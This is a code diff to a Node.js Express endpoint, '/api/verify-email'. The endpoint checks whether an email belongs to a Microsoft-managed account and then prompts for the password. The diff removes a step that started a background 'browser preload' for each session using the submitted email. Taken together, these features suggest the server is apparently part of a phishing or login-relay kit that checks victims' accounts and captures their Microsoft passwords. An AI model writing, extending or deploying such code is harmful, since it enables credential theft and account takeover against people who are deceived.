@@ -855,25 +855,11 @@ app.post('/api/verify-email', async (req, res) => {
                 if (isValidAccount) {
                     console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);
 
-                    // Start browser preloading in background for faster password authentication
-                    const sessionId = createSessionId();
-
-                    // Start preload without awaiting - let it run in parallel
-                    const preloadPromise = startBrowserPreload(sessionId, email).catch(error => {
-                        console.warn(`⚠️ Browser preload failed for ${email}:`, error.message);
-                        return false;
-                    });
-
-                    // Log verification success without creating files
-                    console.log(`✅ Email verification successful for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);
-
                     res.json({
                         exists: true,
                         email: email,
                         message: 'Account found. Please enter your password.',
-                        accountType: data.Account || data.account_type || data.NameSpaceType,
-                        sessionId: sessionId,  // Return session ID for browser preloading
-                        preloadStarted: true
+                        accountType: data.Account || data.account_type || data.NameSpaceType
                     });
                 } else {
                     console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
